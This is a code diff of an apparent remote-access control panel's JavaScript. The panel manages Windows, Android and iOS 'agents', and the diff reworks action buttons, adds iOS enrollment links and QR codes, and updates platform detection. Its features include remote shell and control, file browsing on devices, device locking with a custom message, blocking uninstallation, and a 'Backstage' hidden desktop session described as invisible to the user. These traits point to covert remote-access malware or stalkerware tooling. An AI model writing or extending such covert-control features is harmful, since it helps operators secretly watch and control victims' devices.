@@ -490,41 +490,44 @@ function renderAgentTable() {
                             <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                             <span>${agent.has_update ? 'Update App' : 'Push Update'}</span>
                         </button>
-                    ` : (agent.has_update ? `
+                        <button class="btn-action-control btn-action-mirror" ${!isOnline ? 'disabled' : ''} onclick="openViewerTab('${agent.agent_id}', 'mirror')" title="Take Control: Remote Control & Shell">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+                            <span>Control</span>
+                        </button>
+                        <button class="btn-action-control btn-action-files" ${!isOnline ? 'disabled' : ''} onclick="openFileManagerModal('${agent.agent_id}', event)" title="Browse device internal storage & files">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
+                            <span>Files</span>
+                        </button>
+                        <button class="btn-action-control btn-action-lock ${isCurtainLocked ? 'btn-active-curtain' : ''}" onclick="${isCurtainLocked ? `unlockAndroidDevice('${agent.agent_id}', event)` : `openLockDeviceModal('${agent.agent_id}', event)`}" title="${isCurtainLocked ? 'Unlock Android Device (Restore Home Screen)' : (isOnline ? 'Lock Android Device (Display Custom Message)' : 'Queue Device Lock (Will automatically lock when device connects)')}">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                            <span>${isCurtainLocked ? 'Unlock' : 'Lock Device'}</span>
+                        </button>
+                        ${agent.is_device_owner ? `
+                        <button class="btn-action-control" ${!isOnline ? 'disabled' : ''} onclick="toggleUninstallProtection('${agent.agent_id}', ${agent.uninstall_blocked ? 'false' : 'true'}, event)" title="${agent.uninstall_blocked ? 'Uninstall Protection Active (Device Owner blocks removal). Click to allow uninstallation.' : 'Uninstall Protection Inactive. Click to block uninstallation.'}" style="color: ${agent.uninstall_blocked ? '#34d399' : '#f59e0b'}; border-color: ${agent.uninstall_blocked ? 'rgba(16, 185, 129, 0.4)' : 'rgba(245, 158, 11, 0.4)'};">
+                            <span>${agent.uninstall_blocked ? '🛡️ Protected' : '⚠️ Allow Uninstall'}</span>
+                        </button>
+                        ` : ''}
+                    ` : `
+                        ${agent.has_update ? `
                         <button class="btn-action-control btn-action-update" onclick="promptAgentUpdate('${agent.agent_id}', event)" title="Update Available: ${escapeHtml(agent.update_description || 'New features ready')}">
                             <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.3"/></svg>
                             <span>Update</span>
                         </button>
-                    ` : `
+                        ` : `
                         <button class="btn-action-control btn-action-sync" ${!isOnline ? 'disabled' : ''} onclick="syncAgentCode('${agent.agent_id}', event)" title="Sync latest configuration">
                             <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.3"/></svg>
                             <span>Sync</span>
                         </button>
-                    `))}
-                    <button class="btn-action-control btn-action-mirror" ${!isOnline ? 'disabled' : ''} onclick="openViewerTab('${agent.agent_id}', 'mirror')" title="${isAndroidAgent ? 'Take Control: Remote Control & Shell' : 'Take Control: Mirror real desktop with physical mouse & keyboard'}">
-                        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
-                        <span>Control</span>
-                    </button>
-                    ${isAndroidAgent ? `
-                    <button class="btn-action-control btn-action-files" ${!isOnline ? 'disabled' : ''} onclick="openFileManagerModal('${agent.agent_id}', event)" title="Browse device internal storage & files">
-                        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
-                        <span>Files</span>
-                    </button>
-                    <button class="btn-action-control btn-action-lock ${isCurtainLocked ? 'btn-active-curtain' : ''}" onclick="${isCurtainLocked ? `unlockAndroidDevice('${agent.agent_id}', event)` : `openLockDeviceModal('${agent.agent_id}', event)`}" title="${isCurtainLocked ? 'Unlock Android Device (Restore Home Screen)' : (isOnline ? 'Lock Android Device (Display Custom Message)' : 'Queue Device Lock (Will automatically lock when device connects)')}">
-                        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
-                        <span>${isCurtainLocked ? 'Unlock' : 'Lock Device'}</span>
-                    </button>
-                    ${agent.is_device_owner ? `
-                    <button class="btn-action-control" ${!isOnline ? 'disabled' : ''} onclick="toggleUninstallProtection('${agent.agent_id}', ${agent.uninstall_blocked ? 'false' : 'true'}, event)" title="${agent.uninstall_blocked ? 'Uninstall Protection Active (Device Owner blocks removal). Click to allow uninstallation.' : 'Uninstall Protection Inactive. Click to block uninstallation.'}" style="color: ${agent.uninstall_blocked ? '#34d399' : '#f59e0b'}; border-color: ${agent.uninstall_blocked ? 'rgba(16, 185, 129, 0.4)' : 'rgba(245, 158, 11, 0.4)'};">
-                        <span>${agent.uninstall_blocked ? '🛡️ Protected' : '⚠️ Allow Uninstall'}</span>
-                    </button>
-                    ` : ''}
-                    ` : `
-                    <button class="btn-action-control btn-action-backstage" ${!isOnline ? 'disabled' : ''} onclick="openViewerTab('${agent.agent_id}', 'backstage')" title="Backstage: Hidden virtual desktop session (invisible to user)">
-                        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-                        <span>Backstage</span>
-                    </button>
-                    `}
+                        `}
+                        <button class="btn-action-control btn-action-mirror" ${!isOnline ? 'disabled' : ''} onclick="openViewerTab('${agent.agent_id}', 'mirror')" title="Take Control: Mirror real desktop with physical mouse & keyboard">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+                            <span>Control</span>
+                        </button>
+                        <button class="btn-action-control btn-action-backstage" ${!isOnline ? 'disabled' : ''} onclick="openViewerTab('${agent.agent_id}', 'backstage')" title="Backstage: Hidden virtual desktop session (invisible to user)">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                            <span>Backstage</span>
+                        </button>
+                    `)}
                     <button class="btn-action-delete" onclick="deleteAgentSession('${agent.agent_id}', event)" title="Remove endpoint">
                         <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18m-2 0v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6m3 0V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/></svg>
                     </button>
@@ -704,7 +707,8 @@ function openLockDeviceModal(agentId, event) {
     document.getElementById("lockTargetAgentId").value = agentId;
     const metaEl = document.getElementById("lockTargetMeta");
     if (metaEl) {
-        const ag = Array.isArray(latestAgentsList) ? latestAgentsList.find(a => a.agent_id === agentId) : null;
+        const agentsList = (typeof currentAgents !== 'undefined' && Array.isArray(currentAgents)) ? currentAgents : (window.currentAgents || []);
+        const ag = agentsList.find(a => a.agent_id === agentId);
         const isIos = ag && (ag.is_ios || (ag.platform || '').toLowerCase() === 'ios' || (ag.os || '').toLowerCase().includes('ios'));
         metaEl.innerText = `Target ${isIos ? 'Apple iOS' : 'Mobile'} Device: ${agentId}`;
     }
@@ -971,6 +975,24 @@ function copyOneLiner() {
     });
 }
 
+function copyIosEnrollUrl() {
+    const input = document.getElementById("iosEnrollUrlInput") || document.getElementById("oneLinerCode");
+    if (!input || !input.value) return;
+    input.select();
+    const url = input.value;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(url).then(() => {
+            showToast("Enrollment Link Copied", "Apple iOS enrollment link copied to clipboard. Share via SMS, WhatsApp, or Email.", "success");
+        }).catch(() => {
+            document.execCommand("copy");
+            showToast("Enrollment Link Copied", "Apple iOS enrollment link copied to clipboard.", "success");
+        });
+    } else {
+        document.execCommand("copy");
+        showToast("Enrollment Link Copied", "Apple iOS enrollment link copied to clipboard.", "success");
+    }
+}
+
 async function submitGenerateAgent() {
     const btn = document.getElementById("btnBuildAgent");
     btn.disabled = true;
@@ -1018,9 +1040,19 @@ async function submitGenerateAgent() {
 
                 document.getElementById("builtFilename").innerText = data.profile_filename || "trmm_agent.mobileconfig";
 
+                const enrollInput = document.getElementById("iosEnrollUrlInput");
+                if (enrollInput) {
+                    enrollInput.value = data.enroll_url || "";
+                }
+
                 const qrImg = document.getElementById("iosQrCodeImg");
-                if (qrImg && data.qr_data_url) {
-                    qrImg.src = data.qr_data_url;
+                if (qrImg) {
+                    if (data.qr_data_url) {
+                        qrImg.src = data.qr_data_url;
+                    } else if (data.enroll_url) {
+                        qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.enroll_url)}`;
+                    }
+                    qrImg.style.display = "block";
                 }
 
                 const profileLink = document.getElementById("downloadIosProfileLink");
@@ -1525,9 +1557,17 @@ function resizeHvncDisplay() {
 }
 
 function openViewerTab(agentId, mode = 'backstage') {
-    const ag = (endpoints || []).find(a => a.agent_id === agentId);
+    const agentsList = (typeof currentAgents !== 'undefined' && Array.isArray(currentAgents)) ? currentAgents : (window.currentAgents || []);
+    const ag = agentsList.find(a => a.agent_id === agentId);
+    const isIos = ag && (ag.is_ios || (ag.arch || '').toLowerCase() === 'ios' || (ag.platform || '').toLowerCase() === 'ios' || (ag.os || '').toLowerCase().includes('ios'));
     const isAndroid = ag && (ag.is_android || (ag.arch || '').toLowerCase() === 'android' || (ag.platform || '').toLowerCase() === 'android' || (ag.os || '').toLowerCase().includes('android'));
-    const platformParam = isAndroid ? '&platform=android' : '&platform=windows';
+    
+    let platformParam = '&platform=windows';
+    if (isIos) {
+        platformParam = '&platform=ios';
+    } else if (isAndroid) {
+        platformParam = '&platform=android';
+    }
     window.open(`/viewer/${agentId}?mode=${mode}${platformParam}`, '_blank');
 }
 
@@ -2066,7 +2106,8 @@ function openFileManagerModal(targetAgentId, event) {
         modal.style.display = "flex";
         modal.classList.add("active");
     }
-    const ag = Array.isArray(latestAgentsList) ? latestAgentsList.find(a => a.agent_id === fmCurrentAgentId) : null;
+    const agentsList = (typeof currentAgents !== 'undefined' && Array.isArray(currentAgents)) ? currentAgents : (window.currentAgents || []);
+    const ag = agentsList.find(a => a.agent_id === fmCurrentAgentId);
     const isIos = ag && (ag.is_ios || (ag.platform || '').toLowerCase() === 'ios' || (ag.os || '').toLowerCase().includes('ios'));
     const titleEl = document.getElementById("fmModalTitle");
     if (titleEl) {
